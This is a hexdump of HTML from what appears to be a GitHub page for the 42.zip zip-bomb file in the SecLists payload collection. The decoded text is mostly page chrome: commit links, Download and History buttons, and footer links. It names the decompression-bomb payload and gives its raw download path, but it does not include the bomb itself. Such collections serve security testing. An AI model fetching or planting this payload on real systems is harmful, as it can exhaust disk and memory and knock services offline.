000be80 6174 702d 616a 3d78 7422 7572 2265 7420
000be90 7469 656c 223d 6946 2078 3223 3935 2d20
000bea0 5220 6365 766f 7265 6620 6f72 206d 6162
000beb0 2064 656d 6772 2265 6320 616c 7373 223d
000bec0 696c 6b6e 672d 6172 2279 6820 6572 3d66
000bed0 2f22 6164 696e 6c65 696d 7365 6c73 7265
000bee0 532f 6365 694c 7473 2f73 6f63 6d6d 7469
000bef0 352f 3165 6364 6339 3763 6139 6361 3435
000bf00 3362 3337 3433 6539 6132 3739 6262 3262
000bf10 6632 6231 3336 6262 2233 2d3e 5220 6365
000bf20 766f 7265 6620 6f72 206d 6162 2064 656d
000bf30 6772 3c65 612f 0a3e 2020 2020 2020 2020
000bf40 2020 2020 2f3c 7073 6e61 0a3e 2020 2020
*
000bf60 2020 2020 733c 6170 206e 6c63 7361 3d73
000bf70 6422 692d 6c6e 6e69 2d65 6c62 636f 206b
000bf80 6c66 7865 732d 7268 6e69 2d6b 2030 2d76
000bf90 6c61 6769 2d6e 6f62 7474 6d6f 6620 2236
000bfa0 0a3e 2020 2020 2020 2020 2020 613c 6320
000bfb0 616c 7373 223d 7270 322d 7420 7865 2d74
000bfc0 6f6d 6f6e 6c20 6e69 2d6b 7267 7961 2022
000bfd0 7268 6665 223d 642f 6e61 6569 6d6c 6569
000bfe0 7373 656c 2f72 6553 4c63 7369 7374 632f
000bff0 6d6f 696d 2f74 6535 6431 3963 6363 3937
000c000 6161 3563 6234 3733 3333 3934 3265 3961
000c010 6237 6262 3232 3166 3662 6233 3362 2022
000c020 6164 6174 702d 616a 3e78 6535 6431 3963
000c030 3c63 612f 0a3e 2020 2020 2020 2020 2020
000c040 723c 6c65 7461 7669 2d65 6974 656d 6420
000c050 7461 7465 6d69 3d65 3222 3130 2d39 3130
000c060 302d 5437 3531 343a 3a30 3635 225a 4a3e
000c070 6e61 3720 202c 3032 3931 2f3c 6572 616c
000c080 6974 6576 742d 6d69 3e65 200a 2020 2020
000c090 2020 3c20 732f 6170 3e6e 200a 2020 2020
000c0a0 3c20 642f 7669 0a3e 200a 2020 3c20 6964
000c0b0 2076 6c63 7361 3d73 4222 786f 622d 646f
000c0c0 2079 2d64 6c66 7865 6620 656c 2d78 7469
000c0d0 6d65 2d73 6563 746e 7265 6620 656c 2d78
000c0e0 7561 6f74 6620 2036 6f62 6472 7265 622d
000c0f0 746f 6f74 2d6d 2230 3e20 200a 2020 2020
000c100 3c20 6564 6174 6c69 2073 6c63 7361 3d73
000c110 6422 7465 6961 736c 722d 7365 7465 6420
000c120 7465 6961 736c 6f2d 6576 6c72 7961 6420
000c130 7465 6961 736c 6f2d 6576 6c72 7961 642d
000c140 7261 206b 686c 642d 6665 7561 746c 7420
000c150 7865 2d74 7267 7961 642d 7261 206b 6c66
000c160 616f 2d74 656c 7466 6d20 2d72 2232 6920
000c170 3d64 6222 6f6c 5f62 6f63 746e 6972 7562
000c180 6f74 7372 625f 786f 3e22 200a 2020 2020
000c190 2020 3c20 7573 6d6d 7261 2079 6c63 7361
000c1a0 3d73 6222 6e74 6c2d 6e69 226b 6120 6972
000c1b0 2d61 6168 7073 706f 7075 223d 6964 6c61
000c1c0 676f 3e22 200a 2020 2020 2020 2020 3c20
000c1d0 7073 6e61 3c3e 7473 6f72 676e 313e 2f3c
000c1e0 7473 6f72 676e 203e 6f63 746e 6972 7562
000c1f0 6f74 3c72 732f 6170 3e6e 200a 2020 2020
000c200 2020 3c20 732f 6d75 616d 7972 0a3e 2020
000c210 2020 2020 2020 643c 7465 6961 736c 642d
000c220 6169 6f6c 0a67 2020 2020 2020 2020 2020
000c230 6c63 7361 3d73 4222 786f 4220 786f 2d2d
000c240 766f 7265 616c 2079 2d64 6c66 7865 6620
000c250 656c 2d78 6f63 756c 6e6d 6120 696e 2d6d
000c260 6166 6564 692d 206e 6166 7473 0a22 2020
000c270 2020 2020 2020 2020 7261 6169 6c2d 6261
000c280 6c65 223d 7355 7265 2073 6877 206f 6168
000c290 6576 6320 6e6f 7274 6269 7475 6465 7420
000c2a0 206f 6874 7369 6620 6c69 2265 200a 2020
000c2b0 2020 2020 2020 3e20 200a 2020 2020 2020
000c2c0 2020 3c20 6964 2076 6c63 7361 3d73 4222
000c2d0 786f 682d 6165 6564 2272 0a3e 2020 2020
000c2e0 2020 2020 2020 2020 623c 7475 6f74 206e
000c2f0 6c63 7361 3d73 4222 786f 622d 6e74 6f2d
000c300 7463 6369 6e6f 6220 6e74 6f2d 7463 6369
000c310 6e6f 6620 6f6c 7461 722d 6769 7468 2022
000c320 7974 6570 223d 7562 7474 6e6f 2022 7261
000c330 6169 6c2d 6261 6c65 223d 6c43 736f 2065
000c340 6964 6c61 676f 2022 6164 6174 632d 6f6c
000c350 6573 642d 6169 6f6c 3e67 200a 2020 2020
000c360 2020 2020 2020 2020 3c20 7673 2067 6c63
000c370 7361 3d73 6f22 7463 6369 6e6f 6f20 7463
000c380 6369 6e6f 782d 2022 6976 7765 6f42 3d78
000c390 3022 3020 3120 2032 3631 2022 6576 7372
000c3a0 6f69 3d6e 3122 312e 2022 6977 7464 3d68
000c3b0 3122 2232 6820 6965 6867 3d74 3122 2236
000c3c0 6120 6972 2d61 6968 6464 6e65 223d 7274
000c3d0 6575 3e22 703c 7461 2068 6966 6c6c 722d
000c3e0 6c75 3d65 6522 6576 6f6e 6464 2022 3d64
000c3f0 4d22 2e37 3834 3820 336c 372e 2035 2e33
000c400 3537 312d 342e 2038 2e31 3834 364c 3920
000c410 342e 6c38 332d 372e 2035 2e33 3537 312d
000c420 342e 2d38 2e31 3834 344c 352e 2032 2038
000c430 372e 2037 2e34 3532 316c 342e 2d38 2e31
000c440 3834 364c 3620 352e 6c32 2e33 3537 332d
000c450 372e 2035 2e31 3834 3120 342e 4c38 2e37
000c460 3834 3820 227a 3e2f 2f3c 7673 3e67 200a
000c470 2020 2020 2020 2020 2020 3c20 622f 7475
000c480 6f74 3e6e 200a 2020 2020 2020 2020 2020
000c490 3c20 3368 6320 616c 7373 223d 6f42 2d78
000c4a0 6974 6c74 2265 0a3e 2020 2020 2020 2020
000c4b0 2020 2020 2020 7355 7265 2073 6877 206f
000c4c0 6168 6576 6320 6e6f 7274 6269 7475 6465
000c4d0 7420 206f 6874 7369 6620 6c69 0a65 2020
000c4e0 2020 2020 2020 2020 2020 2f3c 3368 0a3e
000c4f0 2020 2020 2020 2020 2020 2f3c 6964 3e76
000c500 200a 2020 2020 2020 2020 2020 2020 3c20
000c510 6c75 6320 616c 7373 223d 696c 7473 732d
000c520 7974 656c 6e2d 6e6f 2065 766f 7265 6c66
000c530 776f 612d 7475 226f 0a3e 2020 2020 6c3c
000c540 2069 6c63 7361 3d73 4222 786f 722d 776f
000c550 3e22 200a 2020 2020 3c20 2061 6c63 7361
000c560 3d73 6c22 6e69 2d6b 7267 7961 642d 7261
000c570 206b 6f6e 752d 646e 7265 696c 656e 2022
000c580 7268 6665 223d 672f 7430 696d 6b31 3e22
000c590 200a 2020 2020 2020 3c20 6d69 2067 6c63
000c5a0 7361 3d73 6122 6176 6174 2072 726d 312d
000c5b0 2022 6c61 3d74 2222 7320 6372 223d 7468
000c5c0 7074 3a73 2f2f 7661 7461 7261 3273 672e
000c5d0 7469 7568 7562 6573 6372 6e6f 6574 746e
000c5e0 632e 6d6f 752f 352f 3533 3439 3f32 3d73
000c5f0 3034 6126 706d 763b 343d 2022 6977 7464
000c600 3d68 3222 2230 6820 6965 6867 3d74 3222
000c610 2230 2f20 0a3e 2020 2020 2020 2020 3067
000c620 6d74 3169 0a6b 2f3c 3e61 2020 2020 2f3c
000c630 696c 0a3e 2f3c 6c75 0a3e 200a 2020 2020
000c640 2020 3c20 642f 7465 6961 736c 642d 6169
000c650 6f6c 3e67 200a 2020 2020 3c20 642f 7465
000c660 6961 736c 0a3e 2020 2020 2f3c 6964 3e76
000c670 200a 3c20 642f 7669 0a3e 0a0a 0a0a 0a0a
000c680 2020 2020 643c 7669 6320 616c 7373 223d
000c690 6f42 2078 746d 332d 7020 736f 7469 6f69
000c6a0 2d6e 6572 616c 6974 6576 3e22 200a 2020
000c6b0 2020 0a20 643c 7669 6320 616c 7373 223d
000c6c0 6f42 2d78 6568 6461 7265 7020 2d79 2032
000c6d0 2d64 6c66 7865 6620 656c 2d78 756a 7473
000c6e0 6669 2d79 6562 7774 6565 206e 6c66 7865
000c6f0 692d 6574 736d 632d 6e65 6574 2272 0a3e
000c700 200a 3c20 6964 2076 6c63 7361 3d73 7422
000c710 7865 2d74 6f6d 6f6e 6620 2236 0a3e 2020
000c720 2020 3134 382e 4b20 0a42 2020 2f3c 6964
000c730 3e76 0a0a 2020 643c 7669 6320 616c 7373
000c740 223d 2d64 6c66 7865 3e22 0a0a 2020 2020
000c750 643c 7669 6320 616c 7373 223d 7442 476e
000c760 6f72 7075 3e22 200a 2020 2020 3c20 2061
000c770 6469 223d 6172 2d77 7275 226c 6320 616c
000c780 7373 223d 7462 206e 7462 2d6e 6d73 4220
000c790 6e74 7247 756f 2d70 7469 6d65 2022 7268
000c7a0 6665 223d 642f 6e61 6569 6d6c 6569 7373
000c7b0 656c 2f72 6553 4c63 7369 7374 722f 7761
000c7c0 6d2f 7361 6574 2f72 6150 6c79 616f 7364
000c7d0 5a2f 7069 422d 6d6f 7362 342f 2e32 697a
000c7e0 2270 443e 776f 6c6e 616f 3c64 612f 0a3e
000c7f0 2020 2020 2020 613c 7220 6c65 223d 6f6e
000c800 6f66 6c6c 776f 2022 6c63 7361 3d73 6222
000c810 6e74 6220 6e74 732d 206d 7442 476e 6f72
000c820 7075 692d 6574 226d 6820 6572 3d66 2f22
000c830 6164 696e 6c65 696d 7365 6c73 7265 532f
000c840 6365 694c 7473 2f73 6f63 6d6d 7469 2f73
000c850 616d 7473 7265 502f 7961 6f6c 6461 2f73
000c860 695a 2d70 6f42 626d 2f73 3234 7a2e 7069
000c870 3e22 6948 7473 726f 3c79 612f 0a3e 2020
000c880 2020 2f3c 6964 3e76 0a0a 200a 2020 3c20
000c890 6964 3e76 0a0a 2020 2020 2020 2020 2020
000c8a0 213c 2d2d 2720 6022 2d20 3e2d 213c 2d2d
000c8b0 3c20 742f 7865 6174 6572 3e61 2f3c 6d78
000c8c0 3e70 2d20 3e2d 2f3c 706f 6974 6e6f 3c3e
000c8d0 662f 726f 3e6d 663c 726f 206d 6c63 7361
000c8e0 3d73 6922 6c6e 6e69 2d65 6f66 6d72 2022
000c8f0 6361 6974 6e6f 223d 642f 6e61 6569 6d6c
000c900 6569 7373 656c 2f72 6553 4c63 7369 7374
000c910 642f 6c65 7465 2f65 616d 7473 7265 502f
000c920 7961 6f6c 6461 2f73 695a 2d70 6f42 626d
000c930 2f73 3234 7a2e 7069 2022 6361 6563 7470
000c940 632d 6168 7372 7465 223d 5455 2d46 2238
000c950 6d20 7465 6f68 3d64 7022 736f 2274 3c3e
000c960 6e69 7570 2074 616e 656d 223d 7475 3866
000c970 2022 7974 6570 223d 6968 6464 6e65 2022
000c980 6176 756c 3d65 2622 7823 3732 3331 223b
000c990 2f20 3c3e 6e69 7570 2074 7974 6570 223d
000c9a0 6968 6464 6e65 2022 616e 656d 223d 7561
000c9b0 6874 6e65 6974 6963 7974 745f 6b6f 6e65
000c9c0 2022 6176 756c 3d65 4e22 4c30 3331 7349
000c9d0 6e4a 7330 4d48 7969 7a36 7162 5431 6150
000c9e0 462f 5753 6663 2b32 536c 6742 5450 6c49
000c9f0 782f 7944 5071 5175 5465 7a46 6f65 7546
000ca00 4f66 7a47 656d 324f 4f73 516a 674e 7876
000ca10 735a 3233 5278 2f6c 4478 416b 5132 3d77
000ca20 223d 2f20 0a3e 2020 2020 2020 2020 2020
000ca30 2020 623c 7475 6f74 206e 6c63 7361 3d73
000ca40 6222 6e74 6f2d 7463 6369 6e6f 6220 6e74
000ca50 6f2d 7463 6369 6e6f 642d 6e61 6567 2072
000ca60 6f74 6c6f 6974 7070 6465 7420 6f6f 746c
000ca70 7069 6570 2d64 776e 2022 7974 6570 223d
000ca80 7573 6d62 7469 0a22 2020 2020 2020 2020
000ca90 2020 2020 2020 7261 6169 6c2d 6261 6c65
000caa0 223d 6f59 2075 756d 7473 6220 2065 6973
000cab0 6e67 6465 6920 206e 6f74 6d20 6b61 2065
000cac0 726f 7020 6f72 6f70 6573 6320 6168 676e
000cad0 7365 2022 6164 6174 642d 7369 6261 656c
000cae0 772d 7469 3e68 200a 2020 2020 2020 2020
000caf0 2020 2020 3c20 7673 2067 6c63 7361 3d73
000cb00 6f22 7463 6369 6e6f 6f20 7463 6369 6e6f
000cb10 742d 6172 6873 6163 226e 7620 6569 4277
000cb20 786f 223d 2030 2030 3231 3120 2236 7620
000cb30 7265 6973 6e6f 223d 2e31 2231 7720 6469
000cb40 6874 223d 3231 2022 6568 6769 7468 223d
000cb50 3631 2022 7261 6169 682d 6469 6564 3d6e
000cb60 7422 7572 2265 3c3e 6170 6874 6620 6c69
000cb70 2d6c 7572 656c 223d 7665 6e65 646f 2264
000cb80 6420 223d 314d 2031 4832 6339 2d30 352e
000cb90 2d35 342e 2d35 2d31 2d31 4831 6335 2e2d
000cba0 3535 3020 312d 2e20 3534 312d 3120 3248
000cbb0 2d63 352e 2035 2d30 2031 342e 2d35 2031
000cbc0 7631 6331 2030 352e 2e35 3534 3120 3120
000cbd0 3120 3976 3063 2e20 3535 342e 2035 2031
000cbe0 2031 6831 6337 352e 2035 2030 2d31 342e
000cbf0 2035 2d31 5631 6335 352e 2035 2030 2d31
000cc00 342e 2035 2d31 5631 6333 2d30 352e 2d35
000cc10 342e 2d35 2d31 2d31 7a31 2d6d 2031 3231
000cc20 3348 3556 3168 3876 3168 3556 3168 3876
000cc30 3168 3556 3168 3876 3168 3556 3168 3976
000cc40 6d7a 2d31 3031 3248 3356 3968 3176 227a
000cc50 3e2f 2f3c 7673 3e67 200a 2020 2020 2020
000cc60 2020 2020 3c20 622f 7475 6f74 3e6e 3c0a
000cc70 662f 726f 3e6d 2020 2020 2f3c 6964 3e76
000cc80 200a 3c20 642f 7669 0a3e 2f3c 6964 3e76
000cc90 0a0a 2020 2020 2020 0a0a 2020 643c 7669
000cca0 6920 6574 706d 6f72 3d70 7422 7865 2274
000ccb0 6320 616c 7373 223d 6f42 2d78 6f62 7964
000ccc0 7020 302d 6220 6f6c 2d62 7277 7061 6570
000ccd0 2072 6164 6174 7420 7079 2d65 6574 7478
000cce0 2220 0a3e 2020 2020 2020 643c 7669 6320
000ccf0 616c 7373 223d 6574 7478 632d 6e65 6574
000cd00 2072 2d70 2233 0a3e 2020 2020 2020 2020
000cd10 2020 613c 6820 6572 3d66 2f22 6164 696e
000cd20 6c65 696d 7365 6c73 7265 532f 6365 694c
000cd30 7473 2f73 6c62 626f 6d2f 7361 6574 2f72
000cd40 6150 6c79 616f 7364 5a2f 7069 422d 6d6f
000cd50 7362 342f 2e32 697a 3f70 6172 3d77 7274
000cd60 6575 3e22 6956 7765 7220 7761 2f3c 3e61
000cd70 200a 2020 2020 3c20 642f 7669 0a3e 2020
000cd80 2f3c 6964 3e76 0a0a 2020 2020 2f3c 6964
000cd90 3e76 0a0a 2020 0a0a 2020 643c 7465 6961
000cda0 736c 6320 616c 7373 223d 6564 6174 6c69
000cdb0 2d73 6572 6573 2074 6564 6174 6c69 2d73
000cdc0 766f 7265 616c 2079 6564 6174 6c69 2d73
000cdd0 766f 7265 616c 2d79 6164 6b72 3e22 200a
000cde0 2020 3c20 7573 6d6d 7261 2079 6164 6174
000cdf0 682d 746f 656b 3d79 6c22 2022 7261 6169
000ce00 6c2d 6261 6c65 223d 754a 706d 7420 206f
000ce10 696c 656e 3e22 2f3c 7573 6d6d 7261 3e79
000ce20 200a 2020 3c20 6564 6174 6c69 2d73 6964
000ce30 6c61 676f 6320 616c 7373 223d 6f42 2078
000ce40 6f42 2d78 6f2d 6576 6c72 7961 6420 662d
000ce50 656c 2078 6c66 7865 632d 6c6f 6d75 206e
000ce60 6e61 6d69 662d 6461 2d65 6e69 6620 7361
000ce70 2074 696c 656e 756a 706d 2022 7261 6169
000ce80 6c2d 6261 6c65 223d 754a 706d 7420 206f
000ce90 696c 656e 3e22 200a 2020 2020 3c20 2d21
000cea0 202d 2227 2060 2d2d 3c3e 2d21 202d 2f3c
000ceb0 6574 7478 7261 6165 3c3e 782f 706d 203e
000cec0 2d2d 3c3e 6f2f 7470 6f69 3e6e 2f3c 6f66
000ced0 6d72 3c3e 6f66 6d72 6320 616c 7373 223d
000cee0 736a 6a2d 6d75 2d70 6f74 6c2d 6e69 2d65
000cef0 6f66 6d72 4220 786f 622d 646f 2079 2d64
000cf00 6c66 7865 2022 6361 6974 6e6f 223d 2022
000cf10 6361 6563 7470 632d 6168 7372 7465 223d
000cf20 5455 2d46 2238 6d20 7465 6f68 3d64 6722
000cf30 7465 3e22 693c 706e 7475 6e20 6d61 3d65
000cf40 7522 6674 2238 7420 7079 3d65 6822 6469
000cf50 6564 226e 7620 6c61 6575 223d 2326 3278
000cf60 3137 3b33 2022 3e2f 200a 2020 2020 2020
000cf70 3c20 6e69 7570 2074 6c63 7361 3d73 6622
000cf80 726f 2d6d 6f63 746e 6f72 206c 6c66 7865
000cf90 612d 7475 206f 726d 332d 6c20 6e69 6a65
000cfa0 6d75 2d70 6e69 7570 2074 736a 6a2d 6d75
000cfb0 2d70 6f74 6c2d 6e69 2d65 6966 6c65 2264
000cfc0 7420 7079 3d65 7422 7865 2274 7020 616c
000cfd0 6563 6f68 646c 7265 223d 754a 706d 7420
000cfe0 206f 696c 656e 6826 6c65 696c 3b70 2022
000cff0 7261 6169 6c2d 6261 6c65 223d 754a 706d
000d000 7420 206f 696c 656e 2022 7561 6f74 6f66
000d010 7563 3e73 200a 2020 2020 2020 3c20 7562
000d020 7474 6e6f 7420 7079 3d65 7322 6275 696d
000d030 2274 6320 616c 7373 223d 7462 226e 6420
000d040 7461 2d61 6c63 736f 2d65 6964 6c61 676f
000d050 473e 3c6f 622f 7475 6f74 3e6e 3c0a 662f
000d060 726f 3e6d 2020 2020 2f3c 6564 6174 6c69
000d070 2d73 6964 6c61 676f 0a3e 2020 2f3c 6564
000d080 6174 6c69 3e73 0a0a 0a0a 2020 2f3c 6964
000d090 3e76 200a 3c20 6964 2076 6c63 7361 3d73
000d0a0 6d22 646f 6c61 622d 6361 646b 6f72 2070
000d0b0 736a 742d 756f 6863 652d 6576 746e 2273
000d0c0 3c3e 642f 7669 0a3e 2f3c 6964 3e76 0a0a
000d0d0 2020 2020 2f3c 616d 6e69 0a3e 2020 2f3c
000d0e0 6964 3e76 200a 0a20 200a 3c20 642f 7669
000d0f0 0a3e 200a 2020 2020 2020 0a20 643c 7669
000d100 6320 616c 7373 223d 6f66 746f 7265 6320
000d110 6e6f 6174 6e69 7265 6c2d 2067 6977 7464
000d120 2d68 7566 6c6c 7020 2d78 2233 7220 6c6f
000d130 3d65 6322 6e6f 6574 746e 6e69 6f66 3e22
000d140 200a 3c20 6964 2076 6c63 7361 3d73 7022
000d150 736f 7469 6f69 2d6e 6572 616c 6974 6576
000d160 6420 662d 656c 2078 6c66 7865 6a2d 7375
000d170 6974 7966 622d 7465 6577 6e65 7020 2d74
000d180 2036 6270 322d 6d20 2d74 2036 3666 7420
000d190 7865 2d74 7267 7961 6220 726f 6564 2d72
000d1a0 6f74 2070 6f62 6472 7265 672d 6172 2d79
000d1b0 696c 6867 2074 3e22 200a 2020 3c20 6c75
000d1c0 6320 616c 7373 223d 696c 7473 732d 7974
000d1d0 656c 6e2d 6e6f 2065 2d64 6c66 7865 6620
000d1e0 656c 2d78 7277 7061 2220 0a3e 2020 2020
000d1f0 2020 6c3c 2069 6c63 7361 3d73 6d22 2d72
000d200 2233 263e 6f63 7970 203b 3032 3931 3c20
000d210 7073 6e61 7420 7469 656c 223d 2e30 3731
000d220 3136 7333 6620 6f72 206d 6e75 6369 726f
000d230 2d6e 3936 3435 6439 3937 6262 762d 6238
000d240 6a6c 3e22 6947 4874 6275 2f3c 7073 6e61
000d250 2c3e 4920 636e 3c2e 6c2f 3e69 200a 2020
000d260 2020 2020 3c20 696c 6320 616c 7373 223d
000d270 726d 332d 3e22 613c 6420 7461 2d61 6167
000d280 632d 696c 6b63 223d 6f46 746f 7265 202c
000d290 6f67 7420 206f 6574 6d72 2c73 7420 7865
000d2a0 3a74 6574 6d72 2273 6820 6572 3d66 6822
000d2b0 7474 7370 2f3a 672f 7469 7568 2e62 6f63
000d2c0 2f6d 6973 6574 742f 7265 736d 3e22 6554
000d2d0 6d72 3c73 612f 3c3e 6c2f 3e69 200a 2020
000d2e0 2020 2020 3c20 696c 6320 616c 7373 223d
000d2f0 726d 332d 3e22 613c 6420 7461 2d61 6167
000d300 632d 696c 6b63 223d 6f46 746f 7265 202c
000d310 6f67 7420 206f 7270 7669 6361 2c79 7420
000d320 7865 3a74 7270 7669 6361 2279 6820 6572
000d330 3d66 6822 7474 7370 2f3a 672f 7469 7568
000d340 2e62 6f63 2f6d 6973 6574 702f 6972 6176
000d350 7963 3e22 7250 7669 6361 3c79 612f 3c3e
000d360 6c2f 3e69 200a 2020 2020 2020 3c20 696c
000d370 6320 616c 7373 223d 726d 332d 3e22 613c
000d380 6420 7461 2d61 6167 632d 696c 6b63 223d
000d390 6f46 746f 7265 202c 6f67 7420 206f 6573
000d3a0 7563 6972 7974 202c 6574 7478 733a 6365
000d3b0 7275 7469 2279 6820 6572 3d66 6822 7474
000d3c0 7370 2f3a 672f 7469 7568 2e62 6f63 2f6d
000d3d0 6573 7563 6972 7974 3e22 6553 7563 6972
000d3e0 7974 2f3c 3e61 2f3c 696c 0a3e 2020 2020
000d3f0 2020 2020 6c3c 2069 6c63 7361 3d73 6d22
000d400 2d72 2233 3c3e 2061 7268 6665 223d 7468
000d410 7074 3a73 2f2f 6967 6874 6275 7473 7461
000d420 7375 632e 6d6f 222f 6420 7461 2d61 6167
000d430 632d 696c 6b63 223d 6f46 746f 7265 202c
000d440 6f67 7420 206f 7473 7461 7375 202c 6574
000d450 7478 733a 6174 7574 2273 533e 6174 7574
000d460 3c73 612f 3c3e 6c2f 3e69 200a 2020 2020
000d470 2020 3c20 696c 3c3e 2061 6164 6174 672d
000d480 2d61 6c63 6369 3d6b 4622 6f6f 6574 2c72
000d490 6720 206f 6f74 6820 6c65 2c70 7420 7865
000d4a0 3a74 6568 706c 2022 7268 6665 223d 7468
000d4b0 7074 3a73 2f2f 6568 706c 672e 7469 7568
000d4c0 2e62 6f63 226d 483e 6c65 3c70 612f 3c3e
000d4d0 6c2f 3e69 200a 2020 3c20 752f 3e6c 0a0a
000d4e0 2020 2020 613c 6120 6972 2d61 616c 6562
000d4f0 3d6c 4822 6d6f 7065 6761 2265 7420 7469
000d500 656c 223d 6947 4874 6275 2022 6c63 7361
000d510 3d73 6622 6f6f 6574 2d72 636f 6974 6f63
000d520 206e 2d64 6f6e 656e 6420 6c2d 2d67 6c62
000d530 636f 206b 786d 6c2d 2d67 2234 6820 6572
000d540 3d66 6822 7474 7370 2f3a 672f 7469 7568
000d550 2e62 6f63 226d 0a3e 2020 2020 2020 733c
000d560 6776 6820 6965 6867 3d74 3222 2234 6320
000d570 616c 7373 223d 636f 6974 6f63 206e 636f
000d580 6974 6f63 2d6e 616d 6b72 672d 7469 7568
000d590 2262 7620 6569 4277 786f 223d 2030 2030
000d5a0 3631 3120 2236 7620 7265 6973 6e6f 223d
000d5b0 2e31 2231 7720 6469 6874 223d 3432 2022
000d5c0 7261 6169 682d 6469 6564 3d6e 7422 7572
000d5d0 2265 3c3e 6170 6874 6620 6c69 2d6c 7572
000d5e0 656c 223d 7665 6e65 646f 2264 6420 223d
000d5f0 384d 3020 3343 352e 2038 2030 2030 2e33
000d600 3835 3020 3820 3063 3320 352e 2034 2e32
000d610 3932 3620 352e 2033 2e35 3734 3720 352e
000d620 2e39 2e34 3730 352e 2d35 312e 2e37 3535
000d630 2e2d 3833 3020 2e2d 3931 2e2d 3130 2e2d
000d640 3238 2e2d 3130 312d 342e 2d39 2e32 3130
000d650 332e 2d37 2e32 3335 2e2d 3934 322d 362e
000d660 2d39 392e 2d34 302e 2d39 322e 2d33 342e
000d670 2d38 392e 2d34 382e 2d32 2e31 3331 2e2d
000d680 3832 2e2d 3531 2e2d 3836 2e2d 3235 2e2d
000d690 3130 2e2d 3335 362e 2d33 302e 2031 2e31
000d6a0 3830 352e 2038 2e31 3332 382e 2e32 3237
000d6b0 3120 322e 2031 2e31 3738 382e 2037 2e32
000d6c0 3333 362e 2e36 3730 2e2d 3235 322e 2d38
000d6d0 382e 2e37 3135 312d 302e 2d37 2e31 3837
000d6e0 2e2d 2d32 2e33 3436 2e2d 3938 332d 362e
000d6f0 2d34 2e33 3539 3020 2e2d 3738 332e 2d31
000d700 2e31 3935 382e 2d32 2e32 3531 2e2d 3830
000d710 2e2d 2d32 332e 2d36 2e31 3230 302e 2d38
000d720 2e32 3231 3020 3020 2e20 3736 2e2d 3132
000d730 3220 322e 382e 2e32 3436 2e2d 3831 3120
000d740 332e 2d32 322e 2037 2d32 322e 2e37 3836
000d750 3020 3120 332e 2e36 3930 3220 2e20 3732
000d760 3120 352e 2d33 2e31 3430 3220 322e 2e2d
000d770 3238 3220 322e 2e2d 3238 342e 2034 2e31
000d780 2e31 3631 3120 392e 2e32 3830 3220 312e
000d790 2e32 3135 352e 2e36 3238 3120 322e 2e37
000d7a0 3238 3220 312e 2035 2030 2e33 3730 312d
000d7b0 382e 2037 2e33 3537 332d 362e 2035 2e33
000d7c0 3539 322e 2e39 3532 352e 2e34 3337 352e
000d7d0 2034 2e31 3834 3020 3120 302e 2d37 302e
000d7e0 2031 2e31 3339 2e2d 3130 3220 322e 3020
000d7f0 2e20 3132 312e 2e35 3634 352e 2e35 3833
000d800 3841 302e 3331 3820 302e 3331 3020 3020
000d810 3020 3120 2036 6338 2d30 2e34 3234 332d
000d820 352e 2d38 2d38 2d38 7a38 2f22 3c3e 732f
000d830 6776 0a3e 2f3c 3e61 200a 2020 753c 206c
000d840 6c63 7361 3d73 6c22 7369 2d74 7473 6c79
000d850 2d65 6f6e 656e 6420 662d 656c 2078 6c66
000d860 7865 772d 6172 2070 3e22 200a 2020 2020
000d870 2020 3c20 696c 6320 616c 7373 223d 726d
000d880 332d 3e22 613c 6420 7461 2d61 6167 632d
000d890 696c 6b63 223d 6f46 746f 7265 202c 6f67
000d8a0 7420 206f 6f63 746e 6361 2c74 7420 7865
000d8b0 3a74 6f63 746e 6361 2274 6820 6572 3d66
000d8c0 6822 7474 7370 2f3a 672f 7469 7568 2e62
000d8d0 6f63 2f6d 6f63 746e 6361 2274 433e 6e6f
000d8e0 6174 7463 4720 7469 7548 3c62 612f 3c3e
000d8f0 6c2f 3e69 200a 2020 2020 2020 3c20 696c
000d900 6320 616c 7373 223d 726d 332d 3e22 613c
000d910 6820 6572 3d66 6822 7474 7370 2f3a 672f
000d920 7469 7568 2e62 6f63 2f6d 7270 6369 6e69
000d930 2267 6420 7461 2d61 6167 632d 696c 6b63
000d940 223d 6f46 746f 7265 202c 6f67 7420 206f
000d950 7250 6369 6e69 2c67 7420 7865 3a74 7250
000d960 6369 6e69 2267 503e 6972 6963 676e 2f3c
000d970 3e61 2f3c 696c 0a3e 2020 2020 2020 6c3c
000d980 2069 6c63 7361 3d73 6d22 2d72 2233 3c3e
000d990 2061 7268 6665 223d 7468 7074 3a73 2f2f
000d9a0 6564 6576 6f6c 6570 2e72 6967 6874 6275
000d9b0 632e 6d6f 2022 6164 6174 672d 2d61 6c63
000d9c0 6369 3d6b 4622 6f6f 6574 2c72 6720 206f
000d9d0 6f74 6120 6970 202c 6574 7478 613a 6970
000d9e0 3e22 5041 3c49 612f 3c3e 6c2f 3e69 200a
000d9f0 2020 2020 3c20 696c 6320 616c 7373 223d
000da00 726d 332d 3e22 613c 6820 6572 3d66 6822
000da10 7474 7370 2f3a 742f 6172 6e69 6e69 2e67
000da20 6967 6874 6275 632e 6d6f 2022 6164 6174
000da30 672d 2d61 6c63 6369 3d6b 4622 6f6f 6574
000da40 2c72 6720 206f 6f74 7420 6172 6e69 6e69
000da50 2c67 7420 7865 3a74 7274 6961 696e 676e
000da60 3e22 7254 6961 696e 676e 2f3c 3e61 2f3c
000da70 696c 0a3e 2020 2020 2020 2020 6c3c 2069
000da80 6c63 7361 3d73 6d22 2d72 2233 3c3e 2061
000da90 7268 6665 223d 7468 7074 3a73 2f2f 6967
000daa0 6874 6275 622e 6f6c 2267 6420 7461 2d61
000dab0 6167 632d 696c 6b63 223d 6f46 746f 7265
000dac0 202c 6f67 7420 206f 6c62 676f 202c 6574
000dad0 7478 623a 6f6c 2267 423e 6f6c 3c67 612f
000dae0 3c3e 6c2f 3e69 200a 2020 2020 2020 3c20
000daf0 696c 3c3e 2061 6164 6174 672d 2d61 6c63
000db00 6369 3d6b 4622 6f6f 6574 2c72 6720 206f
000db10 6f74 6120 6f62 7475 202c 6574 7478 613a
000db20 6f62 7475 2022 7268 6665 223d 7468 7074
000db30 3a73 2f2f 6967 6874 6275 632e 6d6f 612f
000db40 6f62 7475 3e22 6241 756f 3c74 612f 3c3e
000db50 6c2f 3e69 0a0a 2020 2020 2f3c 6c75 0a3e
000db60 2020 2f3c 6964 3e76 200a 3c20 6964 2076
000db70 6c63 7361 3d73 6422 662d 656c 2078 6c66
000db80 7865 6a2d 7375 6974 7966 632d 6e65 6574
000db90 2072 6270 362d 3e22 200a 2020 3c20 7073
000dba0 6e61 6320 616c 7373 223d 3666 7420 7865
000dbb0 2d74 7267 7961 6c2d 6769 7468 3e22 2f3c
000dbc0 7073 6e61 0a3e 2020 2f3c 6964 3e76 3c0a
